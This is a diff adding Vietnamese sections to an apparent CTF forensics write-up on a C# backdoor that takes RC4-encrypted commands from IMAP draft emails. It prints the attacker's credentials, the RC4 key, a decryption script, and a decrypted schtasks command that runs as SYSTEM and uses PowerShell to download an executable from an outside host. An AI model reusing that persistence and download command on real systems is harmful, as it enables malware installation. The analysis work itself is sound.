@@ -61,7 +61,104 @@ c0b37994963cc0aadd6e78a256c51547  Eldoria_Balance_Issue_Report.pdf.exe
 ```
 `c0b37994963cc0aadd6e78a256c51547`
 
-# Flag4
+# Flag4: What credentials were used to log into the attacker's mailbox?
 Đưa vào DiE biết được đây là 1 file C# vậy chỉ cần đưa vào dotPeek để tìm hiểu
 
 ![image](https://github.com/user-attachments/assets/e12a664e-2d8d-401f-8791-128584efe924)
+
+![image](https://github.com/user-attachments/assets/0038421f-f59b-41eb-86f2-d96a5e6c4c98)
+
+Ngay class đầu tiên ta đã thấy creds của hacker
+
+`proplayer@email.com:completed`
+
+# Flag5: What is the name of the task scheduled by the attacker?
+File độc trên, nói chung là sẽ kết nối đến `mail.korptech.net` tại port143(IMAP), đăng nhập với `creds` và `r_creds`, tìm tiêu đề mail trong mục Draft, lấy nội dung mail, Giải mã lệnh được mã hoá và thực hiện qua `cmd.exe` rồi mã hoá kết quả của lệnh và gửi cho hacker qua email
+
+Các payload được mã hoá dưới dạng base64+hardcoded RC4 key nên không dễ dàng decode base64 như bình thường được 
+
+Vậy mỗi khi hacker muốn thực hiện lệnh nào đó trên máy của người dùng thì sẽ tạo 1 email, lưu nó vào mục Draft và `email.exe` sẽ thực hiện lệnh đó và gửi về email của hacker
+
+Muốn biết hacker đã lên lịch task nào ta cần tìm ra email chứa payload dưới dạng base64 và decrypt nó, nhớ chatgpt tạo script decrypt
+
+``` py
+import base64
+
+def rc4(key: bytes, data: bytes) -> bytes:
+    """RC4 decryption implementation."""
+    S = list(range(256))
+    j = 0
+    out = bytearray()
+    
+    # Key-scheduling algorithm (KSA)
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    
+    # Pseudo-random generation algorithm (PRGA)
+    i = j = 0
+    for byte in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out.append(byte ^ S[(S[i] + S[j]) % 256])
+    
+    return bytes(out)
+
+# The RC4 key (Replace with the actual key used for encryption)
+key = bytes([
+    168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164,
+    238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44,
+    30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163,
+    229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243,
+    55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
+    111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49,
+    126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227,
+    25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38,
+    72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72,
+    162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
+    246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190,
+    182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204,
+    118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6,
+    241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145,
+    185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
+    227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159
+])
+
+# Example encrypted data (Replace with actual encrypted base64 string)
+encrypted_base64 = "PAYLOAD_BASE64"
+encrypted_data = base64.b64decode(encrypted_base64)
+
+# Decrypt the data
+decrypted_data = rc4(key, encrypted_data)
+decrypted_text = decrypted_data.decode(errors='ignore')  # Use UTF-8 or other encoding
+
+print("Decrypted Text:", decrypted_text)
+
+```
+Tác giả cũng có một cách khác khá hay là dùng cyber chef, có lựa chọn dùng rc4 key với passphrase để decode base64
+
+Sau đó đổi sang theo dõi tcp stream để xem rõ các payload được gửi đi, ví dụ như tcp stream16 có 2 payload
+
+![image](https://github.com/user-attachments/assets/e56d6a80-300b-4202-bede-0e5f5948a7e3)
+
+Khi dịch ra sẽ chạy 2 lệnh là `whoami` và đưa `email.exe` vào phần startup để chạy mỗi khi mở máy
+
+Tìm tiếp đến tcp stream34 sẽ thấy một đoạn base64 nữa và đây chính là flag4
+
+```
+Decrypted Text: schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
+```
+
+Để lập lịch một tác vụ dùng `cmd.exe` có thể dùng lệnh `schtasks`
+
+Payload này tải một file `rakalam.exe` về máy và lưu vào thư mục Temp, truy theo đường link thì file đã bị xoá, theo lời tác giả: `The URL is no longer active, preventing us from determining exactly what was downloaded onto the victim's system. However, based on the malware's behavior, it is likely that the downloaded file served as another persistence mechanism.`
+
+`Synchronization`
+
+# Flag6: What is the API key leaked from the highly valuable file discovered by the attacker?
+Tìm đến tcp stream97 ta được flag6
+
+![image](https://github.com/user-attachments/assets/f2c7f027-a83a-44d2-a02b-7dbfa8e6894a)
+
+`sk-3498fwe09r8fw3f98fw9832fw`
